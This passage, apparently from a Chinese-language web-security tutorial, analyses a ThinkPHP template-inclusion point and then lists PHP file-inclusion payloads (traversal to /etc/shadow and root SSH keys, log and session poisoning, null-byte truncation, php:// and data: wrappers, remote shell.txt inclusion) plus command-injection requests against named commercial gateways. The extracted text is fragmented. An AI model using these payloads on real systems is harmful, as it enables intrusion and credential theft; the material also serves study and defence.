public function
fetch($templateFile='',$charset='',$contentType='text/html',$display=false)
{
- 73 -
$GLOBALS['_viewStartTime'] = microtime(TRUE);
if(null===$templateFile)
// 使用 null 参数作为模版名直接返回不做任何输出
return ;
if(empty($charset))
$charset = C('DEFAULT_CHARSET');
// 网页字符编码
header("Content-Type:".$contentType."; charset=".$charset);
header("Cache-control: private");
//支持页面回跳
//页面缓存
ob_start();
ob_implicit_flush(0);
if(!file_exists_case($templateFile))
// 自动定位模板文件
$templateFile
= $this->parseTemplateFile($templateFile);//关键
函数，只有此处对包含模板做了文件处理，我看看下这个函数。
$engine
= strtolower(C('TMPL_ENGINE_TYPE'));
if('php'==$engine) {
// 模板阵列变量分解成为独立变量
extract($this->tVar, EXTR_OVERWRITE);
// 直接载入 PHP 模板
include $templateFile;
}elseif('think'==$engine && $this->checkCache($templateFile)) {
// 如果是 Think 模板引擎并且缓存有效 分解变量并载入模板缓存
extract($this->tVar, EXTR_OVERWRITE);
//载入模版缓存文件
include
C('CACHE_PATH').md5($templateFile).C('TMPL_CACHFILE_SUFFIX');
}else{
// 模板文件需要重新编译 支持第三方模板引擎
// 调用模板引擎解析和输出
$className
= 'Template'.ucwords($engine);
- 74 -
require_cache(THINK_PATH.'/Lib/Think/Util/Template/'.$className.'.class.php');
$tpl
=
new $className;
$tpl->fetch($templateFile,$this->tVar,$charset);
}
$this->templateFile
=
$templateFile;
// 获取并清空缓存
$content = ob_get_clean();
// 模板内容替换
$content = $this->templateContentReplace($content);
// 布局模板解析
$content = $this->layout($content,$charset,$contentType);
// 输出模板文件
return $this->output($content,$display);
}
对包含文件处理：
private function parseTemplateFile($templateFile) {
if(''==$templateFile) {
// 如果模板文件名为空 按照默认规则定位
$templateFile = C('TMPL_FILE_NAME');
}elseif(strpos($templateFile,'@')){
// 引入其它主题的操作模板 必须带上模块名称 例如
blue@User:add
$templateFile
=
TMPL_PATH.str_replace(array('@',':'),'/',$templateFile).C('TMPL_TEMPLATE_S
UFFIX');
}elseif(strpos($templateFile,':')){
// 引入其它模块的操作模板
$templateFile
=
TEMPLATE_PATH.'/'.str_replace(':','/',$templateFile).C('TMPL_TEMPLATE_SUF
FIX');
}elseif(!is_file($templateFile))
{
// 引入当前模块的其它操作模板
- 75 -
$templateFile =
dirname(C('TMPL_FILE_NAME')).'/'.$templateFile.C('TMPL_TEMPLATE_SUFFIX
');
}
if(!file_exists_case($templateFile))
throw_exception(L('_TEMPLATE_NOT_EXIST_').'['.$templateFile.']');
return $templateFile;
}
有了包含点，我们需要一个含有我们恶意代码的文件，我们利用 thinphp
的错误日志记录功能：
制造错误：
- 76 -
引用 wooyun 文章
PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，
由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，
就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本
地文件包含（Local File Inclusion）漏洞了。
我们来看下面一段 index.php 代码:
if ( $_GET [ 'func' ]) {
include $_GET [ 'func' ];
- 77 -
} else {
include 'default.php' ;
}
程序的本意可能是当提交 url 为
http://example.com/index.php?func=add.php 时，调用 add.php
里面的样式内容和功能。直接访问 http://example.com/index.php
则会包含默认的 default.php
那么问题来了，如果我们提交
http://example.com/index.php?func=upload/pic/evil.jpg ，且
evil.jpg 是由黑客上传到服务器上的一个图片，在图片的末尾添加了恶
意的 php 代码，那么恶意的代码就会被引入当前文件执行。
如果被包含的文件中无有效的 php 代码，则会直接把文件内容输出。
在接下来的内容中会以代码样本作为例子，来给大家介绍各种奇葩猥
琐的利用姿势
普通本地文件包含
include("inc/". $_GET['file']); ?>
包含同目录下的文件：
?file=.htaccess
目录遍历：
?file=../../../../../../../../../var/lib/locate.db ?file=../../../../../../../../../v
ar/lib/mlocate/mlocate.db
（linux 中这两个文件储存着所有文件的路径，需要 root 权限）
包含错误日志：
?file=../../../../../../../../../var/log/apache/error.log
- 78 -
（试试把 UA 设置为“”来使 payload 进入日志）
获取 web 目录或者其他配置文件：
?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf
（更多→http://wiki.apache.org/httpd/DistrosDefaultLayout）
包含上传的附件：
?file=../attachment/media/xxx.file
读取 session 文件：
?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7
（session 文件一般在/tmp 目录下，格式为 sess_[your phpsessid
value]，有时候也有可能在/var/lib/php5 之类的，在此之前建议先读
取配置文件。在某些特定的情况下如果你能够控制 session 的值，也
许你能够获得一个 shell）
如果拥有 root 权限还可以试试读这些东西：
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/root/.ssh/known_hosts
/etc/shadow
/root/.bash_history
/root/.mysql_history
/proc/self/fd/fd[0-9]* (文件标识符)
/proc/mounts
/proc/config.gz
如果有 phpinfo 可以包含临时文件：
参见
- 79 -
http://hi.baidu.com/mmnwzsdvpkjovwr/item/3f7ceb39965145e
ea984284el
有限制的本地文件包含
include("inc/". $_GET['file'] . ".htm"); ?>
%00 截断：
?file=../../../../../../../../../etc/passwd%00
(需要 magic_quotes_gpc=off，PHP 小于 5.3.4 有效)
%00 截断目录遍历：
?file=../../../../../../../../../var/www/%00
(需要 magic_quotes_gpc=off，unix 文件系统，比如 FreeBSD，
OpenBSD，NetBSD，Solaris)
路径长度截断：
?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
(php 版本小于 5.2.8(?)可以成功，linux 需要文件名长于 4096，
windows 需要长于 256
点号截断：
?file=../../../../../../../../../boot.ini/………[…]…………
(php 版本小于 5.2.8(?)可以成功，只适用 windows，点号需要长于
256)
普通远程文件包含
include($_GET['file']); ?>
- 80 -
远程代码执行：
?file=[http|https|ftp]://example.com/shell.txt
(需要 allow_url_fopen=On 并且 allow_url_include=On)
利用 php 流 input：
?file=php://input
(需要 allow_url_include=On，详细→
http://php.net/manual/en/wrappers.php.php)
利用 php 流 filter：
?file=php://filter/convert.base64-encode/resource=index.php
(同上)
利用 data URIs：
?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
(需要 allow_url_include=On)
利用 XSS 执行任意代码：
?file=http://127.0.0.1/path/xss.php?xss=phpcode
(需要 allow_url_fopen=On，allow_url_include=On 并且防火墙或者
白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页
面，就可以注入恶意代码了。条件非常极端和特殊- -)
有限制的远程文件包含
include($_GET['file'] . ".htm"); ?>
?file=http://example.com/shell
?file=http://example.com/shell.txt?
?file=http://example.com/shell.txt%23
(需要 allow_url_fopen=On 并且 allow_url_include=On)
?file=\evilshare\shell.php (只需要 allow_url_include=On)
- 81 -
远程命令执行
惠尔顿上网行为管理系统命令执行
作者：xfkxfk
文件/base/stats/realtime/user_prohibit_internet.php
$ip = $_REQUEST['ip'];
$str = "ipset -A drop_user ".$ip;
exec($str);
直接执行命令
第二处命令执行：
文件/base//stats/realtime/underLineUser.php
'>/usr/local/WholetonTM/htdocs/111111.ph
p
文件/base/tpl/delectSSLL.php
这里 id 可控，直接进入 exec 执行
https://**.**.**.**/base/tpl/delectSSLL.php?id=;echo
'333333'>/usr/local/WholetonTM/htdocs/333333.php
第二处命令执行：
文件/base/vpn/download_nodes.php
变量 upload_dir 可控，而且还进行了过滤，但是不影响
上海格尔安全认证网关管理系统
命令执行
作者：xfkxfk
文件/kssl/kssl/WEBUI/www/api/service.php
 0 ) {
$state =
status_service($service_path);
/*
如果 HRP 状态达到
了期望值，则中止重试操作
*/
if( $state ==
$state_expected ) {
break;
}
else {
sleep(1);
$retry_limit--;
}
}
break;
}
case 'stop': {
if ( true ==
stop_service($service_path) ) {
$retry_limit = 10;
$state_expected = '已停
止';
- 87 -
WEBUI_log( LOG_INFO, "
停止代理服务$service_path"."成功" );
}
else {
WEBUI_log( LOG_INFO, "
停止代理服务$service_path" );
}
while( $service_path != "" &&
$retry_limit > 0 ) {
$state =
status_service($service_path);
/*
如果 HRP 状态达到
了期望值，则中止重试操作
*/
if( $state ==
$state_expected ) {
break;
}
else {
sleep(1);
$retry_limit--;
}
}
break;
}
case 'download': {
$proxy =
get_proxy($service_path);
$usermap_url =
$proxy['usermap_url'];
if( WEBUI_exec( "$SSL_DIR/bin/hrp-download-use
rmap.sh $SSL_DIR/cfg/$service_path", true ) ) {
- 88 -
WEBUI_log( LOG_INFO, "
从$usermap_url"."下载代理服务$service_path"."的用户映射策
略成功" );
}
else {
WEBUI_log( LOG_ERR, "从
$usermap_url"."下载代理服务$service_path"."的用户映射策略
失败" );
}
$acl_url = $proxy['acl_url'];
echo "";
if( WEBUI_exec( "$SSL_DIR/bin/hrp-download-acl.
sh $SSL_DIR/cfg/$service_path", true ) ) {
WEBUI_log( LOG_INFO, "
从$acl_url"."下载代理服务$service_path"."的 ACL 策略成功
" );